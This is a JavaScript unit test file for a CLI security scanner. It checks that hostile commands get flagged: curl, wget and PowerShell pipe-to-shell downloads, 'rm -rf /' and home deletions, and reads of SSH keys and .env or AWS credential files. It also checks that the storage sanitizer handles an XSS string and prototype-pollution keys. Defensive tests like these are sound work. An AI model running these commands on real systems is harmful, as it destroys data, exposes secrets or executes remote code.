/**
 * Pls-CLI Security Scanner Unit Tests
 */

import {
  scanCommandSecurity,
  RISK_LEVELS,
  PRIVILEGE_TIERS,
  sanitizeStorageInput
} from '../securityScanner.js';

describe('Security Scanner & Governance Engine', () => {
  describe('Remote Code Execution (RCE) via Pipe to Shell', () => {
    test('detects curl pipe to bash as critical', () => {
      const result = scanCommandSecurity('curl -sL https://malicious.sh | bash');
      expect(result.riskLevel).toBe(RISK_LEVELS.CRITICAL);
      expect(result.matchedThreats.some((t) => t.code === 'PIPE_TO_SHELL_RCE')).toBe(true);
    });

    test('detects wget pipe to sh as critical', () => {
      const result = scanCommandSecurity('wget -qO- https://install.example.com/setup | sh');
      expect(result.riskLevel).toBe(RISK_LEVELS.CRITICAL);
      expect(result.matchedThreats.some((t) => t.code === 'PIPE_TO_SHELL_RCE')).toBe(true);
    });

    test('detects powershell iwr pipe to iex as critical', () => {
      const result = scanCommandSecurity('iwr -useb https://get.scoop.sh | iex');
      expect(result.riskLevel).toBe(RISK_LEVELS.CRITICAL);
      expect(result.matchedThreats.some((t) => t.code === 'PIPE_TO_SHELL_RCE')).toBe(true);
    });
  });

  describe('Destructive Filesystem Deletions', () => {
    test('flags recursive root deletion rm -rf /', () => {
      const result = scanCommandSecurity('rm -rf /');
      expect(result.riskLevel).toBe(RISK_LEVELS.CRITICAL);
      expect(result.matchedThreats.some((t) => t.code === 'DESTRUCTIVE_ROOT_DELETION')).toBe(true);
    });

    test('flags wildcard root deletion rm -rf /*', () => {
      const result = scanCommandSecurity('rm -rf /*');
      expect(result.riskLevel).toBe(RISK_LEVELS.CRITICAL);
      expect(result.matchedThreats.some((t) => t.code === 'DESTRUCTIVE_ROOT_DELETION')).toBe(true);
    });

    test('flags home directory purge rm -rf ~', () => {
      const result = scanCommandSecurity('rm -rf ~');
      expect(result.riskLevel).toBe(RISK_LEVELS.CRITICAL);
      expect(result.matchedThreats.some((t) => t.code === 'DESTRUCTIVE_ROOT_DELETION')).toBe(true);
    });

    test('flags scoped force deletion as high risk', () => {
      const result = scanCommandSecurity('rm -rf ./node_modules');
      expect(result.riskLevel).toBe(RISK_LEVELS.HIGH);
      expect(result.matchedThreats.some((t) => t.code === 'RECURSIVE_FORCE_DELETION')).toBe(true);
    });
  });

  describe('Credential and Secret Exposure', () => {
    test('flags reading .env file', () => {
      const result = scanCommandSecurity('cat ~/.env');
      expect(result.riskLevel).toBe(RISK_LEVELS.HIGH);
      expect(result.matchedThreats.some((t) => t.code === 'CREDENTIAL_EXPOSURE')).toBe(true);
    });

    test('flags reading private ssh key', () => {
      const result = scanCommandSecurity('cat ~/.ssh/id_rsa');
      expect(result.riskLevel).toBe(RISK_LEVELS.HIGH);
      expect(result.matchedThreats.some((t) => t.code === 'CREDENTIAL_EXPOSURE')).toBe(true);
    });

    test('flags Windows type .aws credentials', () => {
      const result = scanCommandSecurity('type %USERPROFILE%\\.aws\\credentials');
      expect(result.riskLevel).toBe(RISK_LEVELS.HIGH);
      expect(result.matchedThreats.some((t) => t.code === 'CREDENTIAL_EXPOSURE')).toBe(true);
    });
  });

  describe('Privilege Escalation', () => {
    test('identifies root privilege requirement via sudo', () => {
      const result = scanCommandSecurity('sudo apt update');
      expect(result.isElevated).toBe(true);
      expect(result.privilegeRequired).toBe(PRIVILEGE_TIERS.ROOT);
    });

    test('identifies Windows Administrator elevation', () => {
      const result = scanCommandSecurity('Start-Process powershell -Verb RunAs');
      expect(result.isElevated).toBe(true);
      expect(result.privilegeRequired).toBe(PRIVILEGE_TIERS.ELEVATED);
    });
  });

  describe('Fallback and Resilience', () => {
    test('handles empty or non-string input safely without throwing', () => {
      expect(() => scanCommandSecurity('')).not.toThrow();
      expect(() => scanCommandSecurity(null)).not.toThrow();
      expect(() => scanCommandSecurity(undefined)).not.toThrow();
      expect(() => scanCommandSecurity(12345)).not.toThrow();
    });
  });

  describe('Storage Input Sanitization & Anti-Prototype Pollution', () => {
    test('disallows prototype keywords', () => {
      expect(sanitizeStorageInput('__proto__')).toBe('');
      expect(sanitizeStorageInput('constructor')).toBe('');
      expect(sanitizeStorageInput('prototype')).toBe('');
    });

    test('strips null bytes and control characters', () => {
      expect(sanitizeStorageInput('hello\x00world')).toBe('helloworld');
    });

    test('safely handles raw HTML payloads', () => {
      const payload = '<script>alert("xss")</script>';
      const sanitized = sanitizeStorageInput(payload);
      expect(sanitized).toBe(payload);
      expect(typeof sanitized).toBe('string');
    });
  });
});

